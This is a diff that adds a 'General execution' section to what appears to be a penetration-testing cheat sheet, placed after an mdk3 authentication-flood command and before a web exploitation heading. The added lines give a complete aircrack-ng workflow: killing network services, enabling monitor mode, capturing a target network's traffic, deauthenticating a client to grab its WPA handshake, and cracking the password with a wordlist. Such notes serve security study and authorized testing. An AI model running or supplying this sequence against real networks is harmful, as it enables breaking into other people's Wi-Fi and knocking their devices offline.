@@ -2757,6 +2757,15 @@ mdk3 auth test to ap
     mdk3 wlan0mon a -a bssid
 ```
 
+General execution
+```
+    airmon-ng check kill
+    airmon-ng start wlan0
+    airodump-ng -w capture wlan0mon #(use to identify your target network)
+    airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture2 wlan0mon #(switch to a second console)
+    aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 00:0F:B5:AB:CB:9D wlan0mon #(wait 60-120 seconds or longer)
+    aircrack-ng -w ~/wordlist  /home/james/Desktop/wtest/capture2.cap
+```
 
 # Web Exploitation
 ## SQL
